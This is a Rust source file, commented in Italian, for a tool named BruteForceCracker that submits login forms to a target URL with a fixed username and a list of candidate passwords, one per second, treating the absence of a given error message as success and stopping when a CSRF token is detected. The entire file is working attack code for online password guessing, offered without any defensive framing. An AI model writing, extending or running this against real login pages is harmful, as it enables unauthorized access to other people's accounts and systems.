use reqwest::blocking::Client;  // Libreria per le richieste HTTP
use std::time::Duration;  // Per gestire il tempo
use std::thread;  // Per l'utilizzo dei thread

// Definizione della struttura BruteForceCracker per il cracking delle password
struct BruteForceCracker {
    url: String,
    username: String,
    error_message: String,
    client: Client,
}

impl BruteForceCracker {
    fn new(url: String, username: String, error_message: String) -> Self {
        BruteForceCracker { 
            url, 
            username, 
            error_message, 
            client: Client::new(),
        }
    }

    fn crack(&self, password: &str) {
        // Dizionario dei dati per la richiesta POST
        let params = [("LogInID", &self.username), ("Password", password), ("Log In", "submit")];

        // Effettua la richiesta POST all'URL specificato con i dati del dizionario
        let res = self.client.post(&self.url).form(&params).send();

        match res {
            Ok(mut response) => {
                // Controlla se il messaggio di errore specificato è presente nella risposta
                if let Ok(text) = response.text() {
                    if text.contains(&self.error_message) {
                        println!("Password non trovata: {}", password);
                    } else if text.contains("CSRF") || text.contains("csrf") {
                        println!("Token CSRF rilevato! BruteF0rce non funziona su questo sito.");
                        std::process::exit(1);
                    } else {
                        // Se la password è stata trovata, stampa l'username e la password
                        println!("Username: ---> {}", self.username);
                        println!("Password: ---> {}", password);
                    }
                }
            }
            Err(_) => println!("Errore durante l'invio della richiesta POST"),
        }
    }
}

// Funzione per craccare le password
fn crack_passwords(passwords: Vec<&str>, cracker: &BruteForceCracker) {
    for password in passwords {
        cracker.crack(password);
        thread::sleep(Duration::from_secs(1));
    }
}
